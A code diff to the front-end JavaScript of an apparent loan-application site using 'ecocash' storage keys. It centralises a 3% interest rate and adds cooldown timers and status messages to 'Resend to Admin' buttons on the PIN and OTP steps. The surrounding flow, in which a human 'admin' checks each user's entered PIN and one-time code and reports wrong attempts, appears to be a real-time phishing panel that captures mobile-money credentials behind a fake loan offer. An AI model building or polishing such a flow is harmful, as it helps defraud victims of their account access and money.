@@ -20,6 +20,9 @@ let appData = {
 let currentPage = 'page-landing';
 let pinPollingActive = false;
 
+const RESEND_COOLDOWN_MS = 60 * 1000; // 60 seconds
+const INTEREST_RATE = 0.03;            // flat 3%
+
 // ─── localStorage Helpers ───
 function saveState() {
   const state = { appData, currentPage };
@@ -85,7 +88,7 @@ function startApplication() {
 function updateStep1Calc() {
   let amt = parseInt(document.getElementById('s1am').value);
   let dur = parseInt(document.getElementById('s1dur').value);
-  let interest = amt * 0.03;          // ← flat 3%
+  let interest = amt * INTEREST_RATE;      // flat 3%
   let total = amt + interest;
   document.getElementById('s1AmtDisplay').textContent = `$${amt}`;
   document.getElementById('s1DurDisplay').textContent = `${dur} days`;
@@ -120,7 +123,7 @@ function toS3() {
   appData.email = em;
   document.getElementById('sA').textContent = `$${appData.loanAmount}`;
   document.getElementById('sT').textContent = `${appData.loanDuration} Days`;
-  document.getElementById('sR').textContent = `$${(appData.loanAmount * 1.03).toFixed(2)}`;
+  document.getElementById('sR').textContent = `$${(appData.loanAmount * (1 + INTEREST_RATE)).toFixed(2)}`;
   document.getElementById('sN').textContent = `${fi} ${la}`;
   goTo('page-step3');
 }
@@ -245,6 +248,7 @@ function startPinPolling() {
         clearInterval(window._pinInterval);
         pinPollingActive = false;
         clearLoginPin();
+        setResendWaitingStatus('pin', 'clear');
         document.getElementById('pinAttemptsDisplay').textContent = '🔑 Attempts remaining: 3 of 3';
         goTo('page-otp');
         return;
@@ -254,7 +258,6 @@ function startPinPolling() {
         document.getElementById('pinAttemptsDisplay').textContent = `🔑 Attempts remaining: ${remaining} of 3`;
         showError('pinErr', `Wrong PIN. ${remaining} attempt(s) remaining.`);
         clearLoginPin();
-        // STOP polling — user must re-submit a new PIN
         clearInterval(window._pinInterval);
         pinPollingActive = false;
         return;
@@ -313,6 +316,7 @@ function startOtpPolling() {
 
       if (data.status === 'approved') {
         clearInterval(window._otpInterval);
+        setResendWaitingStatus('otp', 'clear');
         showApproval();
         return;
       }
@@ -347,24 +351,12 @@ async function resendOtp() {
   }
 }
 
-// ─── Resend current step (PIN or OTP) ───
-async function requestResend(step) {
-  try {
-    const res = await fetch(`/api/resend-step/${appData.applicationId}/${step}`, { method: 'POST' });
-    const data = await res.json();
-    if (data.ok) alert('Request sent to admin to resend.');
-    else alert('Error: ' + (data.error || 'Unknown error'));
-  } catch (err) {
-    alert('Network error');
-  }
-}
-
 // ─── Approval / Rejection ───
 function showApproval() {
   document.getElementById('aprAmount').textContent = `$${appData.loanAmount}`;
   document.getElementById('aprAmt').textContent = `$${appData.loanAmount}`;
   document.getElementById('aprTerm').textContent = `${appData.loanDuration} Days`;
-  document.getElementById('aprMth').textContent = `$${(appData.loanAmount * (1 + 0.005 * appData.loanDuration)).toFixed(2)}`;
+  document.getElementById('aprMth').textContent = `$${(appData.loanAmount * (1 + INTEREST_RATE)).toFixed(2)}`;
   goTo('page-approval');
   clearState();
 }
@@ -425,6 +417,115 @@ function clearOtpCode() {
   document.querySelectorAll('.otp-box').forEach(inp => inp.value = '');
 }
 
+// ============================================================
+// Resend cooldown + waiting status
+// ============================================================
+function getCooldownKey(step) {
+  return `ecocash_resend_until_${step}`;
+}
+
+function getRemainingCooldown(step) {
+  const until = parseInt(localStorage.getItem(getCooldownKey(step)) || '0', 10);
+  return Math.max(0, until - Date.now());
+}
+
+function startResendCooldown(step, btnId) {
+  const until = Date.now() + RESEND_COOLDOWN_MS;
+  localStorage.setItem(getCooldownKey(step), String(until));
+  applyCooldownUI(step, btnId);
+}
+
+function applyCooldownUI(step, btnId) {
+  const btn = document.getElementById(btnId);
+  if (!btn) return;
+  if (btn._cooldownTimer) {
+    clearInterval(btn._cooldownTimer);
+    btn._cooldownTimer = null;
+  }
+
+  const tick = () => {
+    const remaining = getRemainingCooldown(step);
+    if (remaining <= 0) {
+      btn.disabled = false;
+      btn.classList.remove('cooldown');
+      btn.textContent = '🔄 Resend to Admin';
+      if (btn._cooldownTimer) {
+        clearInterval(btn._cooldownTimer);
+        btn._cooldownTimer = null;
+      }
+      localStorage.removeItem(getCooldownKey(step));
+      return;
+    }
+    const secs = Math.ceil(remaining / 1000);
+    btn.disabled = true;
+    btn.classList.add('cooldown');
+    btn.textContent = `⏳ Resend in ${secs}s`;
+  };
+
+  tick();
+  btn._cooldownTimer = setInterval(tick, 500);
+}
+
+async function requestResend(step) {
+  const btnId = step === 'pin' ? 'resendBtnPin' : step === 'otp' ? 'resendBtnOtp' : 'resendBtnApp';
+
+  if (getRemainingCooldown(step) > 0) return;
+
+  setResendWaitingStatus(step, 'waiting');
+
+  try {
+    const res = await fetch(`/api/resend-step/${appData.applicationId}/${step}`, { method: 'POST' });
+    const data = await res.json();
+    if (res.status === 429 && data.cooldown) {
+      const until = Date.now() + (data.remainingSec * 1000);
+      localStorage.setItem(getCooldownKey(step), String(until));
+      applyCooldownUI(step, btnId);
+      setResendWaitingStatus(step, 'error', data.error);
+      return;
+    }
+    if (data.ok) {
+      startResendCooldown(step, btnId);
+      setResendWaitingStatus(step, 'sent');
+      if (step === 'pin') startPinPolling();
+      else if (step === 'otp') startOtpPolling();
+    } else {
+      setResendWaitingStatus(step, 'error', data.error || 'Failed to resend');
+    }
+  } catch (err) {
+    setResendWaitingStatus(step, 'error', 'Network error');
+  }
+}
+
+function setResendWaitingStatus(step, state, extraMsg) {
+  const statusId = step === 'pin' ? 'resendStatusPin' : step === 'otp' ? 'resendStatusOtp' : 'resendStatusApp';
+  const el = document.getElementById(statusId);
+  if (!el) return;
+
+  if (state === 'waiting') {
+    el.className = 'resend-status show waiting';
+    el.innerHTML = '<span class="rs-dot"></span> Resent — waiting for admin response…';
+  } else if (state === 'sent') {
+    el.className = 'resend-status show waiting';
+    el.innerHTML = '<span class="rs-dot"></span> Sent to admin. Watching for response…';
+  } else if (state === 'clear') {
+    el.className = 'resend-status';
+    el.innerHTML = '';
+  } else if (state === 'error') {
+    el.className = 'resend-status show error';
+    el.innerHTML = '⚠️ ' + (extraMsg || 'Resend failed');
+    setTimeout(() => {
+      el.className = 'resend-status';
+      el.innerHTML = '';
+    }, 4000);
+  }
+}
+
+function restoreResendCooldowns() {
+  applyCooldownUI('pin', 'resendBtnPin');
+  applyCooldownUI('otp', 'resendBtnOtp');
+  applyCooldownUI('app', 'resendBtnApp');
+}
+
 // ─── Restore State on Page Load ───
 document.addEventListener('DOMContentLoaded', function () {
   const restored = loadState();
@@ -445,4 +546,5 @@ document.addEventListener('DOMContentLoaded', function () {
   } else {
     goTo('page-landing');
   }
+  restoreResendCooldowns();
 });
